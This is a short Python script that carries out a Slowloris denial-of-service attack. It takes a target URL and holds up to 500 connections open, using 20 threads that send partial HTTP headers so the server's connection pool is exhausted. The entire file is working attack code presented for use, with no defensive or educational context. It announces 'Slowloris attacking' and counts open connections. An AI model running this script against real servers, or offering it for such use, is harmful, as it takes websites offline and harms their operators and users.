import socket, sys, time, random, signal, threading

raw = sys.argv[1] if len(sys.argv) > 1 else input("Target URL: ").strip()
raw = raw.replace("http://", "").replace("https://", "").split("/")[0]
host = raw.split(":")[0]
port = int(raw.split(":")[1]) if ":" in raw else 80

running = True
sockets = []
lock = threading.Lock()

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
        return s
    except: return None

def worker():
    global running, sockets
    while running:
        with lock:
            for s in sockets[:]:
                try: s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                except: sockets.remove(s)
            while len(sockets) < 500 and running:
                s = connect()
                if s: sockets.append(s)
        time.sleep(5)

def handler(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, handler)
print(f"Slowloris attacking {host}:{port} — Ctrl+C to stop")
print("Hold connections open with partial HTTP headers")
print("=" * 60)
for _ in range(20):
    threading.Thread(target=worker, daemon=True).start()
try:
    while running:
        with lock: n = len(sockets)
        print(f"Open connections: {n} / 500", end="\r")
        time.sleep(1)
except KeyboardInterrupt:
    pass
print(f"\nDone. Peak connections: {len(sockets)}")
